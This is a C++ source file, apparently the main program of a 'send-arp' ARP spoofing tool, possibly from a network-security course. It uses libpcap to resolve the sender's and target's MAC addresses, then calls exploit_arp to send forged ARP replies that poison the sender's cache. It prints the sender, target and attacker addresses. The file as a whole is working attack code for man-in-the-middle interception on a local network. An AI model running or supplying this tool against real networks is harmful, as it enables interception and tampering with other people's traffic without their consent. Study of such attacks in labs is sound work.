#include "send-arp.h"



int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	const char* attacker_ip = get_a_ip(dev);
	const char* attacker_mac = get_a_mac(dev);
	const char* t_mac;
	const char* s_mac;

	for(int i = 0;i < 2;i++){
		struct pcap_pkthdr* header;
    	const u_char* packet;
		const char* t_ip = i ? argv[3] : argv[2];
		
    	send_arp(handle, "ff:ff:ff:ff:ff:ff", attacker_mac, attacker_ip, "00:00:00:00:00:00", t_ip, ARP_REQ);

    	struct ArpHdr arp;

    	while (true)
    	{
			int res = pcap_next_ex(handle, &header, &packet);

			if (res == 0)
				continue;
				
			if (res == PCAP_ERROR_BREAK || res == PCAP_ERROR)
			{
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}
			if (packet != NULL)
			{
				memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
				struct Ip a_ip_chk(attacker_ip);
				struct Mac a_mac_chk(attacker_mac);
				struct Ip chk_t_ip(t_ip);
				if (a_ip_chk == arp.tip() && chk_t_ip == arp.sip() && a_mac_chk == arp.tmac())
					break;
			}
		}

		Mac src_mac = arp.smac();
		uint8_t* smac_ = reinterpret_cast<uint8_t* >(&src_mac);

		if(i) t_mac= get_t_mac(smac_);
		else s_mac = get_s_mac(smac_);

	}
	exploit_arp(handle, s_mac, argv[2], argv[3], attacker_mac);


    printf("Sender IP : %s\n", argv[2]);
    printf("Sender MAC : %s\n", s_mac);
    printf("Target IP : %s\n", argv[3]);
    printf("Target MAC : %s\n", t_mac);
    printf("Attacker IP : %s\n", attacker_ip);
    printf("Attacker MAC : %s\n", attacker_mac);

	pcap_close(handle);
}
